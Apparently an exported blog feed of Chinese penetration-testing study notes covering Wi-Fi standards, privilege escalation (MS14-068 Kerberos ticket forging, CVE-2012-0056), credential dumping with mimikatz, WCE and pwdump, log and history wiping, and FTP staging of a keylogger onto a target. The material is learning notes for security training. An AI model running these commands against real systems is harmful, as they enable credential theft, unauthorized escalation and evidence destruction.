        <content type="html"><![CDATA[<h2 id="无线通信基础知识-IEEE-802-11标准"><a href="#无线通信基础知识-IEEE-802-11标准" class="headerlink" title="无线通信基础知识-IEEE 802.11标准"></a>无线通信基础知识-IEEE 802.11标准</h2><ul><li>无线技术特点<ul><li>行业迅猛发展</li><li>互联网重要入口</li><li>边界模糊</li><li>安全实施缺失而且困难</li><li>对技术不了解导致配置不当</li><li>企业网络私自接入AP破坏网络边界</li></ul></li></ul><a id="more"></a><h3 id="IEEE"><a href="#IEEE" class="headerlink" title="IEEE"></a>IEEE</h3><ul><li>Institute of Electrical and Electronics Engineers<ul><li>由通信航天生物电器电子等方面的科学家组成，目的是制定标准，知道行业发展。</li><li>IEEE分为不同的技术委员会（Committees），其中802委员会负责LAN、MAN标准的制定<ul><li>以太网</li><li>令牌环网</li><li>无线局域网</li><li>网桥</li></ul></li><li>IEEE 802.3是以太网，802.11是WLAN。标准只涉及数据链路层和物理层<ul><li>数据链路层<ul><li>逻辑链路控制子层LLC（802.2）</li><li>媒体访问控制子层MAC</li></ul></li></ul></li></ul></li></ul><h3 id="802-11标准"><a href="#802-11标准" class="headerlink" title="802.11标准"></a>802.11标准</h3><ul><li><p>发布于1997年</p></li><li><p>速率1或2Mbps</p></li><li><p>无线射频信号编码（调制）(radio frequencies)</p><ul><li>Direct-Sequence Spread-Spectrum(DSSS)直序扩频</li><li>Frequence Hopping Spread-Spectrum(FHSS)跳频扩频</li></ul></li><li><p>媒体访问方式——CSMA/CA</p><ul><li>根据算法侦听一定时长</li><li>发送数据包前发声明<ul><li>Request to Send/Clear to Send(RTS/CTS)</li></ul></li></ul></li><li><p>802委员会下第11组负责开发无线局域网标准</p></li><li><p>日常会涉及到的有a/b/g/n/i这几个标准</p></li></ul><h4 id="802-11b"><a href="#802-11b" class="headerlink" title="802.11b"></a>802.11b</h4><ul><li><p>Complementary Code Keying(CCK) 补码键控</p><ul><li>5.5 and 11Mbit/s</li><li>2.4GHz band(2.4GHz-2.485GHz)</li><li>14个重叠的信道 channels</li><li>每个信道22MHz带宽</li><li>只有三个完全不重叠的信道</li></ul></li><li><p>美国 1-11（2.412GHz-2.462GHz）</p></li><li><p>欧洲 1-13（2.412GHz-2.472GHz）</p><p>日本 1-14（2.412GHz-2.484GHz）</p></li></ul><h4 id="802-11a"><a href="#802-11a" class="headerlink" title="802.11a"></a>802.11a</h4><ul><li>与802.11b几乎同时发布<ul><li>因设备价格问题一直没有得到广泛使用</li><li>使用5GHz带宽<ul><li>2.4GHz带宽干扰源多(微波、蓝牙、无绳电话)</li><li>5GHz频率有更多带宽空间，可容纳更多不重叠的信道</li><li>Orthogonal Frequency-Division Multiplexing(OFDM)信号调制方法<ul><li>正交频分复用（802.11b是直序扩频和跳频扩频）</li></ul></li><li>更高速率54Mbps,每个信道20MHz带宽</li><li>变频<ul><li>5.15-5.35GHz</li><li>5.7-5.8GHz</li></ul></li></ul></li></ul></li></ul><h4 id="802-11G"><a href="#802-11G" class="headerlink" title="802.11G"></a>802.11G</h4><ul><li>2.4GHz频率</li><li>Ortheognal Frequency-Division Multiplexing(OFDM)信号调制方法</li><li>与802.11a信速率相同</li><li>可全局降速，向后兼容802.11b,并切换为CCK信号调制方法</li><li>每个信道20/22MHz带宽</li></ul><h4 id="802-11N"><a href="#802-11N" class="headerlink" title="802.11N"></a>802.11N</h4><ul><li>2.4或5GHz频率<ul><li>300Mbps最高600Mbps</li><li>Multiple-Input Multiple-Output(MIMO)多进多出通信技术</li><li>多天线，多无线电波，独立收发信号</li><li>可以使用40MHz信道带宽，使数据传输速率翻倍</li></ul></li><li>全802.11n设备网络中，可以使用新报文格式，使速率达到最大</li><li>每个信道20/40MHz带宽</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>敏感信息收集与隐藏痕迹</title>
      <link href="/2020/09/23/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E9%9A%90%E8%97%8F%E7%97%95%E8%BF%B9/"/>
      <url>/2020/09/23/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E9%9A%90%E8%97%8F%E7%97%95%E8%BF%B9/</url>
      
        <content type="html"><![CDATA[<h3 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h3><ul><li><p>Linux</p><ul><li><table><thead><tr><th>查看信息</th><th>操作</th><th>备注</th></tr></thead><tbody><tr><td>DNS配置</td><td>/etc/resolv.conf</td><td>是否有机会DNS篡改，劫持</td></tr><tr><td>用户账号</td><td>/etc/passwd</td><td></td></tr><tr><td>用户密码</td><td>/etc/shadow</td><td></td></tr><tr><td>当前用户</td><td><code>whoami</code></td><td></td></tr><tr><td>所有登陆用户</td><td><code>who -a</code></td><td></td></tr><tr><td>网卡信息</td><td><code>ifconfig -a</code></td><td></td></tr><tr><td>防火墙设置</td><td><code>iptables -L -n</code></td><td></td></tr><tr><td>路由表</td><td><code>netstat -rn</code></td><td></td></tr><tr><td>操作系统信息</td><td><code>uname -a</code></td><td></td></tr><tr><td>当前运行的进程</td><td><code>ps aux</code></td><td></td></tr><tr><td>安装的软件包</td><td><code>dpkg -l</code></td><td></td></tr></tbody></table><a id="more"></a></li></ul></li></ul><ul><li><p>Windows</p><ul><li><table><thead><tr><th>查看信息</th><th>操作</th><th>备注</th></tr></thead><tbody><tr><td>ip掩码网关等</td><td>ipconfig /all</td><td></td></tr><tr><td>dns缓存</td><td>ipconfig /displaydns</td><td></td></tr><tr><td>开放端口及可执行程序</td><td>netstat -bano</td><td></td></tr><tr><td>路由表</td><td>netstat -r</td><td></td></tr><tr><td>共享</td><td>net view</td><td></td></tr><tr><td>共享</td><td>net view /domain</td><td></td></tr><tr><td>域信息</td><td>net user /domain</td><td></td></tr><tr><td>域信息</td><td>net usr %username% /domain</td><td></td></tr><tr><td>密码策略</td><td>net accounts</td><td></td></tr><tr><td>共享目录</td><td>net share</td><td></td></tr><tr><td>操作：把用户加入管理员组</td><td>net localgroup administrators username /add</td><td></td></tr><tr><td>域控制器主机</td><td>net group “Domain Controllers” /domain</td><td></td></tr><tr><td>操作：开共享</td><td>net share name$=C:/unlimited</td><td></td></tr><tr><td>操作：启动锁定账号</td><td>net user username /active:yes /domain</td><td></td></tr></tbody></table></li></ul></li></ul><h3 id="WMIC-Windows-Management-instrumentation"><a href="#WMIC-Windows-Management-instrumentation" class="headerlink" title="WMIC(Windows Management instrumentation)"></a>WMIC(Windows Management instrumentation)</h3><ul><li>被powershell的Get-WmiObject取代</li><li>Get-WmiObject又被Get-CimInstance取代</li><li>了解下Get-CimInstance</li><li>功能示例：<ul><li>查看网络登陆记录</li><li>查看当前进程，什么程序通过什么命令执行的进程</li><li>结束一个进程</li><li>查看操作系统安装的软件</li><li>静默删除软件</li><li>查看共享文件夹</li><li>开启“允许远程桌面”</li></ul></li></ul><h3 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h3><ul><li>商业信息</li><li>系统信息</li><li>Linux<ul><li>/etc;/usr/local/etc</li><li>/etc/passed;/etc/shadow</li><li>.ssh;.gnupg 公私钥</li><li>邮件和数据文件</li><li>业务数据库,身份认证服务器数据库</li><li>/tmp</li></ul></li><li>Windows<ul><li>SAM数据库；注册表文件</li><li>%SYSTEMROOT%\repair\SAM</li><li>%SYSTEMROOT%\System32\config\Regback\SAM</li><li>业务数据库，身份认证数据库</li><li>临时文件目录<ul><li>UserProfile\AppData\Local\Microsoft\Windows\Temporary Internet Files\</li></ul></li></ul></li></ul><h3 id="隐藏痕迹"><a href="#隐藏痕迹" class="headerlink" title="隐藏痕迹"></a>隐藏痕迹</h3><ul><li><p>Windows</p><ul><li>禁止在登录界面显示新建账号<ul><li>reg add 添加注册表项</li></ul></li><li>del %WINDIR%*.log /a/s/q/f</li></ul></li><li><p>Linux</p><ul><li><p>history</p><ul><li>history -c</li><li>rm .bash_history&amp;&amp;touch .bash_history&amp;&amp;chattr +i .bash_history</li></ul></li><li><p>/var/log/</p><ul><li>auth.log或secure  (REH)</li><li>btmp 或 wtmp 文件(命令：last或lastb)</li><li>lastlog和faillog命令</li></ul></li><li><p>其它日志和HIDS等</p></li></ul></li></ul><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>Ubuntu网络更新源已经不可用，可以先mount安装光盘<code></code>，此时/etc/apt/sources.list会自动添加光盘为更新源，此时再安装软件包，如果光盘中有就可以成功安装。</p><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p>scp</p><p>lsattr</p><p>chattr</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权-利用配置不当提权</title>
      <link href="/2020/09/23/%E6%8F%90%E6%9D%83-%E5%88%A9%E7%94%A8%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/"/>
      <url>/2020/09/23/%E6%8F%90%E6%9D%83-%E5%88%A9%E7%94%A8%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="提权-利用配置不当提权"><a href="#提权-利用配置不当提权" class="headerlink" title="提权-利用配置不当提权"></a>提权-利用配置不当提权</h2><ul><li><p>与漏洞提权相比 更常用的方法</p><ul><li>企业环境</li><li>补丁更新全部已经安装</li><li>输入变量过滤之外更值得研发关注的安全隐患</li></ul></li></ul><a id="more"></a><h3 id="文件读写权限"><a href="#文件读写权限" class="headerlink" title="文件读写权限"></a>文件读写权限</h3><p>如果：</p><ul><li>以system/root权限启动</li><li>NTFS权限允许user修改删除</li></ul><p>那么：</p><ul><li><p>可以用自己的反弹shell，替换服务中的可执行程序</p></li><li><p>或者写一个把当前用户添加到管理员组的Cpp,编译成exe，替换某个程序。当管理员运行该程序时，提权成功。</p></li><li><p>Windows:icacls</p><ul><li><code>icacls c:\windows\\*.exe /save asd /T</code> 查看C:\windows下所有exe的权限</li><li>icacls具体使用方法去搜索</li></ul></li><li><p>Linux:find</p><ul><li><code>find / -perm 777 -exec ls -l {} \;</code></li></ul></li></ul><h3 id="应用系统的配置文件"><a href="#应用系统的配置文件" class="headerlink" title="应用系统的配置文件"></a>应用系统的配置文件</h3><ul><li>如果应用需要连接数据库，那么它的配置文件中很有可能有数据库的账号密码信息</li><li>后台服务运行账号应使用nobody等单独的账号。如果是root,那么通过服务漏洞进入系统直接就是root权限。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权-利用漏洞提权</title>
      <link href="/2020/09/22/%E6%8F%90%E6%9D%83-%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/"/>
      <url>/2020/09/22/%E6%8F%90%E6%9D%83-%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="提权-利用漏洞提权"><a href="#提权-利用漏洞提权" class="headerlink" title="提权-利用漏洞提权"></a>提权-利用漏洞提权</h2><h2 id="Ms11-080"><a href="#Ms11-080" class="headerlink" title="Ms11-080"></a>Ms11-080</h2><ul><li><p>Kb2592799</p><ul><li><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">https://technet.microsoft.com/library/security/ms11-080</a></li></ul></li><li><p>先把python编译成exe，再在目标机器执行</p><a id="more"></a><ul><li><a href="https://pypi.org/project/pywin32/" target="_blank" rel="noopener">https://pypi.org/project/pywin32/</a> (pyinstaller会调用pywin32)</li><li>pyinstaller.org</li></ul></li></ul><figure class="hljs highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">searchsploit ms11-080<br>cp /usr/share/exploitdb/exploits/windows/local/18176.py .<br></code></pre></td></tr></table></figure><ul><li>如果目标机器有python环境，直接执行就可以。</li></ul><h2 id="Ms14-068"><a href="#Ms14-068" class="headerlink" title="Ms14-068"></a>Ms14-068</h2><ul><li><p>从本机管理员权限获取域管理员权限</p></li><li><ol><li><code>searchsploit ms14-068</code>得到35474.py</li><li><code>cp /usr/share/exploitdb/exploits/windows/remote/35474.py ~/ms14-068.py</code></li><li>在windows通过kali /usr/share/windows-resources/binaries/whoami.exe得到域用户的sid，还需要域控制器的ip。</li><li>使用漏洞利用代码生成TGT票据（kerbros协议的票据）<ul><li><code>python ms14-068.py -u u1@lab.com -s S-1-5-21-1226907004-2355705551-2341087478-1109 -d 192.168.0.119</code></li><li>输入u1域用户的密码</li></ul><ol start="5"><li>拷贝票据到windows系统</li></ol></li><li>通过minikatz完成提权<ul><li><code>kerberos::ptc TGT_u1@lab.com.ccache</code> </li></ul></li><li>发现可以访问域控制器的C盘</li></ol><ul><li>如果kali缺少python库文件，下载地址：<a href="https://github.com/bidord/pykek" target="_blank" rel="noopener">https://github.com/bidord/pykek</a></li></ul></li></ul><h2 id="CVE-2012-0056"><a href="#CVE-2012-0056" class="headerlink" title="CVE-2012-0056"></a>CVE-2012-0056</h2><ul><li><p>CVE-2012-0056</p><ul><li>/proc/pid/mem</li><li>kernels&gt;=2.6.39</li><li><a href="http://blog.zx2c4.com/749" target="_blank" rel="noopener">http://blog.zx2c4.com/749</a></li></ul></li><li><p>Ubuntu11.10</p><ul><li><a href="http://old-releases.ubuntu.com/releases/11.10/" target="_blank" rel="noopener">http://old-releases.ubuntu.com/releases/11.10/</a></li></ul></li><li><p>gcc</p><ul><li><code>sudo apt-cdrom add</code>把光盘作为apt的更新源 </li><li><code>sudo apt-get install gcc</code></li><li><code>gcc 18411.c -o exp</code></li></ul></li><li><p>首先searchesploit 18411.c 找到文件位置 <code>/usr/share/exploitdb/exploits/linux/local</code></p></li><li><p>scp /usr/share/exploitdb/exploits/linux/local/18411.c <a href="mailto:flower@192.168.0.110">flower@192.168.0.110</a>:/home/flower</p></li><li><p>gcc编译好后，直接执行./exp，发现命令提示符$变为#，提权成功。</p></li></ul><h2 id="其它："><a href="#其它：" class="headerlink" title="其它："></a>其它：</h2><p>Ms08-067</p><p>Ms09-001</p><p>Ms10-017</p><p>Ms12-020</p><h3 id="Kali修改默认python为python3"><a href="#Kali修改默认python为python3" class="headerlink" title="Kali修改默认python为python3"></a>Kali修改默认python为python3</h3><ul><li><p><code>rm /usr/bin/python</code></p></li><li><p><code>ln -s /usr/bin/python3 /usr/bin/python</code></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows身份认证过程及工作组/域</title>
      <link href="/2020/09/22/Windows%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%8F%8A%E5%B7%A5%E4%BD%9C%E7%BB%84-%E5%9F%9F/"/>
      <url>/2020/09/22/Windows%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%8F%8A%E5%B7%A5%E4%BD%9C%E7%BB%84-%E5%9F%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="Windows身份认证过程"><a href="#Windows身份认证过程" class="headerlink" title="Windows身份认证过程"></a>Windows身份认证过程</h2><ul><li>开机加载操作系统内核，windows启动之后，进入ntlogon.exe，即输入用户名和密码的界面。</li><li>当点击确定后，ntlogon.exe调用lsass.exe（Local Security Assistant）的LsaLogonUser API,该API 调用MSV_1_0身份验证程序包，MSV 身份验证包将用户记录存储在 SAM 数据库（C:\Windows\System32\config）中。<a id="more"></a><ul><li>ntlogon.exe会计算密码的LM(LAN Managere) Hash和NT(Windows NT) Hash</li><li>lsass.exe会将这两种hash与SAM数据库中的进行对比。</li><li>登陆成功后，会指派一个权限令牌，在该用户的lsass.exe进程中。</li></ul></li><li>远程登陆也是在本地计算好LMHash和NTHash，在网络中传输的是Hash而不是明文密码。</li><li>不同的登陆方式，在服务器端处理的方式也不同,大概有十几种：<ul><li>本地登陆：NTML security package</li><li>域登陆：域控制器服务器kerbros协议来响应，kerbros security package</li><li>远程登陆：remote desktopsecurity package</li><li>在多个服务器端的安全包中，其中有1个包（wdigest）在内存中缓存了当前登陆用户的明文密码</li></ul></li><li>推荐阅读<a href="https://support.microsoft.com/zh-cn/help/102716/ntlm-user-authentication-in-windows" target="_blank" rel="noopener">Windows 中的 NTLM 用户身份验证</a></li></ul><h2 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h2><ul><li>工作组就类似于目录，谁想加入某个工作组只要把工作组名字改成那个工作组即可。</li><li>访问网络中的计算机（文件共享）默认使用Guest账号，需要在被访问的计算机启用Guest用户并允许Guest用户远程登陆<ul><li>启用Guest用户：此电脑–》管理–》本地用户和组–》用户–》Guest–》取消打勾“账户已禁用”。</li><li>允许用户远程登陆：控制面板–》管理工具–》本地安全策略–》本地策略–》用户权限分配–》找到 “拒绝从网络访问这台计算机”–》删掉其中的Guest这行。</li></ul></li></ul><h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><ul><li>而域则有一个域控制器（安装ActiveDirectory域控制服务的主机）来注册和管理域中的设备。</li><li>加入域的计算机在开机时或注销后可以选择登陆到域还是登陆到本机。</li><li>登陆到域需要使用域的用户和密码，一般管理员会给每个人都分配一个用户名和密码。</li></ul><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><ul><li>Win+R运行dcpromo将本机升级为域控制器</li><li>Win=R运行dsa.msc管理域中的用户和设备</li></ul><h2 id="微软账户和本地用户"><a href="#微软账户和本地用户" class="headerlink" title="微软账户和本地用户"></a>微软账户和本地用户</h2><ul><li>本地用户在数据在重装系统后丢失，微软账户可以同步OneDrive，邮件等等内容。</li></ul><h2 id="用户密码和PIN"><a href="#用户密码和PIN" class="headerlink" title="用户密码和PIN"></a>用户密码和PIN</h2><ul><li>PIN是Windows系统新添加的一套本地密码策略，不仅提高安全性，而且也可以让很多和账户相关的操作变得更加方便。与微软账户和本地用户无关。<ul><li>设置PIN:设置–》账户–》登陆选项–》Windows Hello PIN</li></ul></li></ul><h2 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h2><ul><li>远程连接网络中的win10设备，需要在被连接的设备上设置”允许远程连接“，第一次连接需要输入用户名和密码，之后则需要在控制面板–》凭据管理器 中修改。</li><li>密码为空的账户默认无法远程登陆，需要在本地安全策略中修改。<ul><li>控制面板–》管理工具–》本地安全策略–》安全选项–》”账户：使用空密码的本地账户只允许进行控制台登陆“修改为禁用。</li></ul></li></ul><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>微软相关认证MSCE,MCST等</p><p>SAM    (Security Account Manager)安全帐户管理器 </p><p>OWF    (One way function)单向函数</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权-本地提权及几个工具(PwDump、WCE、mimikatz)</title>
      <link href="/2020/09/21/%E6%8F%90%E6%9D%83-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%8F%8A%E5%87%A0%E4%B8%AA%E5%B7%A5%E5%85%B7(PwDump%E3%80%81WCE%E3%80%81mimikatz)/"/>
      <url>/2020/09/21/%E6%8F%90%E6%9D%83-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%8F%8A%E5%87%A0%E4%B8%AA%E5%B7%A5%E5%85%B7(PwDump%E3%80%81WCE%E3%80%81mimikatz)/</url>
      
        <content type="html"><![CDATA[<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h3><ul><li>已实现本地低权限账号登陆<ul><li>远程溢出</li><li>直接获得账号密码</li></ul></li><li>希望获得更高权限<ul><li>实现对目标进一步控制</li></ul></li></ul><a id="more"></a><ul><li>系统账号之间权限隔离<ul><li>操作系统安全的基础</li><li>用户空间</li><li>内核空间</li></ul></li><li>系统账号<ul><li>用户账号登陆时获取权限令牌</li><li>服务账号无需用户登陆已在后台启动的服务</li></ul></li><li>Windows<ul><li>user</li><li>Administrator</li><li>System</li></ul></li><li>Linux<ul><li>User</li><li>Root</li></ul></li></ul><h4 id="ADMIN提权为SYSTEM"><a href="#ADMIN提权为SYSTEM" class="headerlink" title="ADMIN提权为SYSTEM"></a>ADMIN提权为SYSTEM</h4><ul><li>Windows system账号<ul><li>系统设置管理功能</li><li>SysInternal Suite</li><li>XP:<code>at 17:07 /interactive cmd</code></li><li>Win7/8<code>sc Create syscmd binPath=&quot;cmd/K start type=own type=interact&quot;</code></li><li>进程注入提权（隐蔽性极强）：<ul><li>pinjector</li><li><code>pinjector.exe -p 656 cmd 5555</code>(656是PID,5555是开放的端口，可以使用nc等连接)</li></ul></li></ul></li></ul><h3 id="抓包嗅探"><a href="#抓包嗅探" class="headerlink" title="抓包嗅探"></a>抓包嗅探</h3><ul><li><p>Windows</p><ul><li>Wireshark</li><li>OmniPeek</li><li>commview</li><li>Sniffpass(提取密码)</li></ul></li><li><p>Linux</p><ul><li>Tcpdump</li><li>Wireshark</li><li>Dsniff</li></ul></li></ul><h3 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><ul><li><p>klogger</p></li><li><p>木马窃取</p><ul><li>Darkcomet-RAT</li><li>…</li></ul></li></ul><h3 id="本地缓存密码"><a href="#本地缓存密码" class="headerlink" title="本地缓存密码"></a>本地缓存密码</h3><ul><li>浏览器缓存的密码<ul><li>IE浏览器</li><li>firefox</li></ul></li><li>网络密码</li><li>无线密码</li><li><a href="http://www.nirsoft.net" target="_blank" rel="noopener">http://www.nirsoft.net</a></li><li>Dump SAM<ul><li>Pwdump直接提取SAM数据库中的密码 (C:\Windows\System32\config\SAM）<ul><li>/usr/share/windows-binaries/fgdump/PwDump.exe</li><li><code>pwdump localhost</code>提取出windows密码的hash,保存为xp.pwdump</li><li>将xp.pwdump导入到kali中的ophdump暴破</li></ul></li></ul></li></ul><h3 id="WCE-Windows-credential-editor"><a href="#WCE-Windows-credential-editor" class="headerlink" title="WCE(Windows credential editor)"></a>WCE(Windows credential editor)</h3><ul><li><p>从内存中（wdigest）读取密码信息（参考<a href="https://pyrrhax.com/2020/09/22/Windows%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%8F%8A%E5%B7%A5%E4%BD%9C%E7%BB%84-%E5%9F%9F/" target="_blank" rel="noopener">Windows身份认证及工作组/域</a>），而不是从SAM数据库，可以避免一些操作系统的限制。</p></li><li><p>/usr/share/windows-resources/wce/</p></li><li><p>需要管理员权限</p></li><li><p>使用：</p><ul><li><p>wce-universal.exe -l / -lv 密文</p></li><li><p>wce-universal.exe -w 明文</p></li><li><p>-s参数还可以修改当前登陆用户的账户</p></li></ul></li><li><p>防止WCE攻击</p><ul><li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages<ul><li>kerberos</li><li>msv1_0</li><li>schannel</li><li>wdigest(本地登陆) 删掉这一项，注意不要留空行。</li><li>tspkg(终端服务，远程桌面)</li><li>pku2u</li></ul></li></ul></li></ul><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><ul><li><code>::</code>查看用法</li><li><code>sekurlsa::wdigest</code> 查看用户与密码相关信息</li><li><code>process::list</code>查看进程及ID</li><li><code>process::suspend /pid:123</code> suspend进程ID为123的进程</li><li><code>ts::multirdp</code>打补丁，允许多用户同时登陆windows，互不干扰</li><li><code>event::clear</code>清除操作系统日志</li><li><code>evenv::drop</code>之后登陆不会再产生日志</li></ul><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul><li>操作系统日志Win+R:eventvwr</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>后渗透-文件传输</title>
      <link href="/2020/09/20/%E5%90%8E%E6%B8%97%E9%80%8F-%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/"/>
      <url>/2020/09/20/%E5%90%8E%E6%B8%97%E9%80%8F-%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/</url>
      
        <content type="html"><![CDATA[<h2 id="后渗透——文件传输"><a href="#后渗透——文件传输" class="headerlink" title="后渗透——文件传输"></a>后渗透——文件传输</h2><ul><li><p>上传工具</p></li><li><p>提权</p></li><li><p>擦除攻击痕迹</p></li><li><p>安装后门</p><ul><li>长期控制</li><li>Dump密码</li><li>内网渗透</li></ul></li><li><p>后漏洞利用阶段</p><ul><li>最大挑战——防病毒软件</li><li>使用合法的远程控制软件</li></ul></li></ul><a id="more"></a><h3 id="上传-下载文件"><a href="#上传-下载文件" class="headerlink" title="上传/下载文件"></a>上传/下载文件</h3><ul><li>持久控制</li><li>扩大对目标系统的控制能力</li></ul><h4 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h4><ul><li>netcat</li><li>curl</li><li>wget</li></ul><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><ul><li><p>缺少预装的下载工具</p></li><li><p>非交互式Shell</p><ul><li>类nc远程控制shell，无法与子命令交互</li><li>ftp 192.168.1.1</li></ul></li><li><p>使用TFTP传输文件</p><ul><li><p>XP、2003默认安装，其它需要单独添加</p></li><li><p>经常被便捷防火墙过滤</p></li><li><p>Kali</p><figure class="hljs highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">mkdir /tftp<br><span class="hljs-built_in">cd</span> /usr/share/windows-binaries<br>ls<br>cp /usr/share/windows-binaries/whoami.exe /tftp<br></code></pre></td></tr></table></figure></li></ul></li><li><p>使用FTP传输文件</p><ul><li><p>先在kali安装pure-ftpd</p><figure class="hljs highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh">apt-get install pure-ftpd<br>groupadd ftpgroup<br>useradd -g ftpgroup -d /dev/null -s /etc ftpuser<br>pure-pw useradd pyrrhax -u ftpuser -d /ftphome<br>pure-pw mkdb<br><span class="hljs-built_in">cd</span> /etc/pure-ftpd/auth<br>ln -s ../conf/PureDB 60pdb<br>mkdir -p /ftphome<br>chown -R ftpuser:ftpgroup /ftphome/<br>/etc/init.d/pure-ftpd restart<br></code></pre></td></tr></table></figure></li><li><p>在windows使用cmd上下载文件</p><figure class="hljs highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> open 192.168.0.112 21&gt;ftp.txt<br><span class="hljs-built_in">echo</span> pyrrhax&gt;&gt;ftp.txt<br><span class="hljs-built_in">echo</span> password&gt;&gt;ftp.txt<br><span class="hljs-built_in">echo</span> bin&gt;&gt;ftp.txt<br><span class="hljs-built_in">echo</span> GET whoami.exe&gt;&gt;ftp.txt<br><span class="hljs-built_in">echo</span> GET klogger.exe&gt;&gt;ftp.txt<br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">bye</span>&gt;&gt;ftp.txt<br>ftp -s:ftp.txt<br></code></pre></td></tr></table></figure></li><li><p>使用PowerShell下载文件</p></li></ul></li><li><p>使用DEBUG传输文件</p><ul><li>汇编、反汇编</li><li>16进制dump工具</li><li>64k字节</li><li>过程：<ol><li>upx压缩文件</li><li>wine exe2bat.exe nc.exe nc.hex</li><li>debug&lt;nc.hex</li><li>copy 1.dll nc.exe</li></ol></li></ul></li></ul><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul><li>plink.exe 命令行ssh连接工具</li><li>radmin.exe远程控制工具</li><li>sbd 类nc 程序</li><li>可执行文件压缩工具upx</li><li>可执行程序转文本 <code>wine /usr/share/windows-binaries/exe2bat.exe  xxxx.exe xxx.txt</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>缓冲区溢出</title>
